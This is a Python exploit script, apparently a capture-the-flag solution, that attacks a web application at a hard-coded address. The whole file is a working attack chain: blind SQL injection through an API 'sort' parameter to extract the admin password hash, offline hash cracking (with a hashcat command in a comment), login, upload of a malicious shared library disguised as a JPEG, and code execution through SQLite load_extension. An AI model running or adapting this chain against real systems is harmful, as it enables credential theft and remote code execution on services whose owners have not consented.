import requests
import json
import time
import re

url = "http://125.220.147.47:49245"
pass_hash = ""

def burp_password():

    payload = "case when (substr(({}),{},1)>'{}') then id else -id end"
    sql_query = 'select(Password)from(Users)'

    result = ''
    length = -1
    target = 32

    while len(result) != target:
        length = len(result)
        low = 48
        high = 122
        mid = (low + high)//2
        while(low < high): 
            time.sleep(0.04)
            # print(low, high, mid)
            res = requests.post(url=url + '/api/list', data= json.dumps({
                "page":0,"sort": payload.format(sql_query, length+1, chr(mid)), "order":"", "rules":"", "limit":"2"
            }), headers={"Content-Type": "application/json"}, proxies= {"http": "http://127.0.0.1:10721"})
            if re.findall(r'"id":(\d)', res.text)[0] == '5':
                high = mid
            else:
                low = mid+1
            mid = (low + high)//2
        result += chr(mid)
        print(result)
    return result

def burp_md5():
    # use hashcat plz
    return input('password:')

def login(password):
    res = requests.post(
             url=url + '/api/login', 
             headers={
                  "Content-Type": "application/json",
             },
             data= json.dumps({
                "username":"admin",
                "password": password
             })
        )
    return res.json()['token']

def upload(token):
    files = {
        "file": ("evil.jpg", open("./evil.so", "rb"), "image/jpg")
    }
    res = requests.post(url + '/api/uploads', files=files, data = {"desc": "this is desc"}, headers={"Authorization": f"Bearer {token}"})

def getshell():
    requests.post(
        url=url + '/api/list', 
        headers={
            "Content-Type": "application/json",
        },
        data= json.dumps({
        "page":"0",
        "sort": "CASE WHEN (select load_extension('./uploads/evil.jpg')) THEN Id ELSE -Id END", 
        "order":"", 
        "rules":"", 
        "limit":"2"
        })
    )


if __name__ == '__main__':
    pass_hash = burp_password()
    print(pass_hash)
    password = burp_md5()
    token = login(password)
    # 编译so gcc -g -fPIC -shared evil.c -o evil.so
    # hashcat -m 0 -a 3 -2 ?u?l?d md5string ?2?2?2?2?2?2+salt
    upload(token)
    getshell()
